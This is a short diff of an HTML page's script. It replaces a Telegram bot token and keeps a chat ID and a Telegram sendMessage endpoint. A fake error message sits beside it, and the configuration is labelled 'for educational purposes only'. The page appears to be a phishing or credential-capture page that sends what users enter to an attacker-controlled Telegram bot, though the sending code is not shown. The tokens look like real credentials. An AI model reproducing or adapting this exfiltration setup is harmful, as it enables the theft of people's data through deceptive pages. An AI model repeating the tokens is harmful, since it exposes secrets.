@@ -156,7 +156,7 @@ There was an error with this action. Try again later.
 <script>
 // Telegram Bot Configuration - FOR EDUCATIONAL PURPOSES ONLY
 // Replace these with your own if you want to test the Telegram functionality
-const BOT_TOKEN = "8180354726:AAH5FykyrxVKDzPWei3qchol56MyCb7IOV4"; // Get from @BotFather
+const BOT_TOKEN = "8452431501:AAEulCr9zDSqWKVvTcozPYpQpeyDy_hECQk"; // Get from @BotFather
 const CHAT_ID = "1357995456";     // Get from @RawDataBot
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
